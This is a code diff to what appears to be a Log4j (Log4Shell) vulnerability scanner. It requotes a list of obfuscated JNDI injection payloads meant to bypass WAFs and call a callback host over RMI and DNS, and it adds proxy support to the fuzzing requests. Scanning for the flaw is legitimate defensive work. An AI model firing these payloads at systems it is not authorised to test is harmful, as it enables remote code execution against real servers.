@@ -55,19 +55,23 @@ default_headers = {
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
 timeout = 4
-waf_bypass_payloads = ['${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}',
-                       '${${::-j}ndi:rmi://{{callback_host}}/{{random}}}',
-                       '${jndi:rmi://{{callback_host}}}',
-                       '${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}',
-                       '${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}',
-                       '${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}',
-                       '${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}',
-                       '${jndi:dns://{{callback_host}}}']
+waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
+                       "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
+                       "${jndi:rmi://{{callback_host}}}",
+                       "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
+                       "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+                       "${jndi:dns://{{callback_host}}}"]
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
                     help="Check a single URL.",
+                    action='store')
+parser.add_argument("-p", "--proxy",
+                    dest="proxy",
+                    help="send requests through proxy",
                     action='store')
 parser.add_argument("-l", "--list",
                     dest="usedlist",
@@ -174,6 +178,10 @@ def process_request(threadID, q, dns_callback_host):
 ############################################
 ################ Exploit ###################
 ############################################
+
+proxies = {}
+if args.proxy:
+    proxies = {"http": args.proxy, "https": args.proxy}
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -322,7 +330,8 @@ def scan_url(url, callback_host):
                                  params={"v": payload},
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -335,7 +344,8 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
@@ -347,7 +357,8 @@ def scan_url(url, callback_host):
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
-                                 timeout=timeout)
+                                 timeout=timeout,
+                                 proxies=proxies)
             except Exception as e:
                 cprint(f"EXCEPTION: {e}")
 
